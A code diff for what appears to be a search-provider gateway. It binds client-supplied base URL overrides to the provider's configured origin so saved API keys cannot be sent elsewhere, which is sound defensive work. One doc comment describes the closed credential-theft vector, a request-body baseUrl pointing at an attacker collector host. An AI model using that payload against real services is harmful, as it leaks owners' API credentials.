@@ -64,33 +64,136 @@ export function getProviderSetting(params, key) {
 }
 
 /**
- * Resolve base URL with optional override from providerOptions.baseUrl.
+ * Normalized destination origin — `protocol://host:port` with the implicit port
+ * made explicit and the hostname lowercased / trailing-dot stripped. Two URLs
+ * count as the *same destination* only when their origins match: matching on
+ * origin instead of hostname also refuses an https→http downgrade or a port
+ * swap, either of which would move the credential to a channel the owner never
+ * configured. Returns null for values that are not a parseable http(s) URL.
  *
- * The override is client-controlled and therefore SSRF-hardened: only public
- * http(s) URLs are accepted (internal/private/loopback/metadata addresses are
- * rejected via assertPublicUrl). The provider's own configured baseUrl is
- * trusted as-is (admin-controlled).
+ * @param {unknown} value
+ * @returns {string|null}
+ */
+function originOf(value) {
+  const raw = typeof value === "string" ? value.trim() : "";
+  if (!raw) return null;
+  let parsed;
+  try {
+    parsed = new URL(raw);
+  } catch {
+    return null;
+  }
+  if (parsed.protocol !== "http:" && parsed.protocol !== "https:") return null;
+  const host = parsed.hostname.toLowerCase().replace(/\.+$/, "");
+  const port = parsed.port || (parsed.protocol === "https:" ? "443" : "80");
+  return `${parsed.protocol}//${host}:${port}`;
+}
+
+/** Trimmed non-empty string, else undefined. */
+function strOrUndef(value) {
+  return typeof value === "string" && value.trim().length > 0 ? value.trim() : undefined;
+}
+
+/**
+ * True when the request being built carries ANY credential. Deliberately not
+ * string-typed: a token that reaches the header bag as a number/object would
+ * still be serialized onto the wire, so treating it as "absent" would reopen
+ * the exact leak this guard exists to close.
+ */
+function hasCredential(params) {
+  const token = params?.token;
+  return token != null && String(token).trim() !== "";
+}
+
+/**
+ * Resolve base URL, honouring an endpoint override.
+ *
+ * Two override sources exist and they are NOT equally trusted:
+ *   • `providerOptions.baseUrl`      → comes straight from the request body, so
+ *                                       it is attacker-chosen (any gateway API
+ *                                       key, or a loopback caller without one).
+ *   • `providerSpecificData.baseUrl` → stored on the owner's connection / custom
+ *                                       node by the dashboard; admin-controlled.
+ *
+ * Guards, in order:
+ *  1. Shape + layer-1 SSRF (`assertPublicUrl`): http(s) only, never an internal
+ *     or metadata literal address. Applies to both sources, as before.
+ *  2. Credential binding (client source only): a client-supplied override may
+ *     only *shadow* the destination the attached credential already belongs to —
+ *     the provider's registry baseUrl or the owner's custom node. A request that
+ *     carries no credential (authType "none", e.g. self-hosted SearXNG) may
+ *     still point anywhere public, which keeps the BYO-instance use case.
+ *
+ * Without rule 2 the endpoint override is a straight credential-theft primitive:
+ * `provider_options.baseUrl: "https://collector.attacker.example"` made the
+ * server POST to the attacker with `X-API-Key`/`Authorization` set to the
+ * owner's saved serper/tavily/exa/… key, and layer-1 happily passes any public
+ * host. The network layer is separately covered by `fetchPublic` (DNS-resolved
+ * check + per-hop redirect revalidation) in handlers/search/index.js.
  *
  * @param {SearchProviderConfig} config
  * @param {SearchRequestParams} params
  * @returns {string}
  */
 export function resolveBaseUrl(config, params) {
-  const override = getProviderSetting(params, "baseUrl");
-  if (override) {
-    // SSRF guard: client-supplied base URLs must be public http(s) only.
-    let parsed;
-    try {
-      parsed = new URL(override);
-    } catch {
-      throw new Error(`Invalid baseUrl: ${override}`);
-    }
-    if (parsed.protocol !== "http:" && parsed.protocol !== "https:") {
-      throw new Error(`Invalid baseUrl protocol: ${parsed.protocol}`);
-    }
-    assertPublicUrl(override);
+  const clientOverride = strOrUndef(params.providerOptions?.baseUrl);
+  const ownerOverride = strOrUndef(params.providerSpecificData?.baseUrl);
+  const override = clientOverride || ownerOverride;
+  if (!override) return (config.baseUrl || "").replace(/\/+$/, "");
+
+  let parsed;
+  try {
+    parsed = new URL(override);
+  } catch {
+    throw new Error(`Invalid baseUrl: ${override}`);
   }
-  return (override || config.baseUrl).replace(/\/+$/, "");
+  if (parsed.protocol !== "http:" && parsed.protocol !== "https:") {
+    throw new Error(`Invalid baseUrl protocol: ${parsed.protocol}`);
+  }
+  // SSRF guard (layer 1): internal/private/metadata literals never leave here.
+  assertPublicUrl(override);
+
+  if (clientOverride && hasCredential(params)) {
+    const allowed = new Set(
+      [originOf(config.baseUrl), originOf(ownerOverride)].filter(Boolean)
+    );
+    if (!allowed.has(originOf(override))) {
+      throw new Error(
+        "provider_options.baseUrl may not point at a host other than the provider's " +
+          "configured endpoint while a saved credential is attached"
+      );
+    }
+  }
+
+  return override.replace(/\/+$/, "");
+}
+
+/**
+ * Final boundary check before a built search request hits the network.
+ *
+ * Every builder above routes through `resolveBaseUrl`, so rule 2 of that
+ * function is what actually refuses an attacker-chosen host today. This exists
+ * so the invariant cannot be reintroduced by a future builder that assembles
+ * its own URL (or by the generic unknown-provider fallback): a request that
+ * carries a saved credential may only target the provider's configured
+ * destination — the registry `baseUrl` or the owner's custom node.
+ *
+ * Keyless requests (authType "none", e.g. self-hosted SearXNG) have no
+ * credential to leak and may target any public host, which is the BYO case.
+ *
+ * @param {SearchProviderConfig} config
+ * @param {SearchRequestParams} params
+ * @param {string} url The fully built outbound URL
+ */
+export function assertCredentialDestination(config, params, url) {
+  if (!hasCredential(params)) return;
+  const allowed = new Set(
+    [originOf(config?.baseUrl), originOf(params.providerSpecificData?.baseUrl)].filter(Boolean)
+  );
+  if (allowed.has(originOf(url))) return;
+  throw new Error(
+    "Refusing to send the saved provider credential to an unconfigured destination"
+  );
 }
 
 /**
